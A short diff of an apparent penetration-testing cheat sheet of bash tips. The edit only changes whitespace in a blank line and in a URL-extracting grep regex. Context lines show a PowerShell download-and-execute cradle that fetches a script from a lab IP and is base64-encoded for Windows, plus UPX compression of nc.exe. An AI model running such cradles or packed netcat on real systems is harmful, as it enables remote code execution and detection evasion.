@@ -123,7 +123,7 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
- 
+
 #Exe compression
 upx -9 nc.exe
 
@@ -185,7 +185,7 @@ grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > 
 #Extract HTTP URLs from text files
 grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
 #For extracting HTTPS, FTP and other URL format use
-grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
+grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"    ]*|www.[-a-z0-9.]+)[^ .,;    >">):]' *.txt > urls.txt
 #Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"
 
 #Extract Floating point numbers
